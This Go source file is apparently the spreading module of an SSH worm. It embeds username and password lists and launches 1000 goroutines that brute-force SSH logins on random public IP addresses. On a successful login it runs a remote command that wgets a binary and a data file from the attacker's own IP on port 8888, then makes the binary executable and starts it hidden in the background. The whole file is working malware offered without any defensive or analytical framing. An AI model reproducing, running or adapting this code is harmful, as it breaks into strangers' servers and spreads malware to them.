package main

import (
	_ "embed"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

var usernamesBrute []string
var passwordsBrute []string

//go:embed usernames.txt
var usm_emb string

//go:embed passwords.txt
var pwd_emb string

func init_unm_pw() {
	usernamesBrute = strings.Split(usm_emb, "\n")
	passwordsBrute = strings.Split(pwd_emb, "\n")

	for i := 0; i < len(usernamesBrute); i++ {
		usernamesBrute[i] = strings.TrimSpace(usernamesBrute[i])
	}

	for i := 0; i < len(passwordsBrute); i++ {
		passwordsBrute[i] = strings.TrimSpace(passwordsBrute[i])
	}
}

func dial_ssh(host string, username string, password string) (client *ssh.Client, err error) {
	config := ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Second * 5,
	}

	fmt.Printf("Dialing %s -> %s:%s\n", host, username, password)
	client, err = ssh.Dial("tcp", host, &config)
	if err != nil {
		fmt.Println("Error dialing ssh " + error.Error(err))
		return nil, errors.New("Error dialing ssh")
	}

	return client, nil
}

func brute(host string, username string, password string) {
	client, err := dial_ssh(host, username, password)
	if err != nil {
		fmt.Println("Could not connect to host: ", error.Error(err))
		return
	}
	defer client.Close()

	sess, err := client.NewSession()
	if err != nil {
		fmt.Println("Error creating ssh session")
		return
	}

	myip := GetOutboundIP()

	cmd := fmt.Sprintf("ulimit -n 65535; "+
		"wget http://%s:8888/api/v1/get -O .get; "+
		"wget http://%s:8888/api/v1/book -O .book.dat; "+
		"chmod +x ./.get; "+
		"nohup ./.get 2>&1 &>/dev/null &", myip, myip)

	out, err := sess.Output(cmd)
	if err != nil {
		fmt.Println("Error executing command")
		return
	}

	fmt.Println("Bruted ", host, ":", username, ":", password)
	fmt.Println(string(out))
}

func get_rand_ip() string {
	a := randInt(1, 254)
	b, c, d := randInt(1, 254), randInt(1, 254), randInt(1, 254)
	ip := fmt.Sprintf("%d.%d.%d.%d", a, b, c, d)
	if IsPublicIP(net.ParseIP(ip)) {
		return ip
	} else {
		return get_rand_ip()
	}
}

func brute_process() {
	for {
		brute(get_rand_ip()+":22", randChoiceStr(usernamesBrute), randChoiceStr(passwordsBrute))
	}
}

func spread_brute() {
	for i := 0; i < 1000; i++ {
		go brute_process()
	}
}

func init_brute() {
	init_unm_pw()
	go spread_brute()
}

func test_brute() {
	brute("localhost:22", "gem", "gem")
}
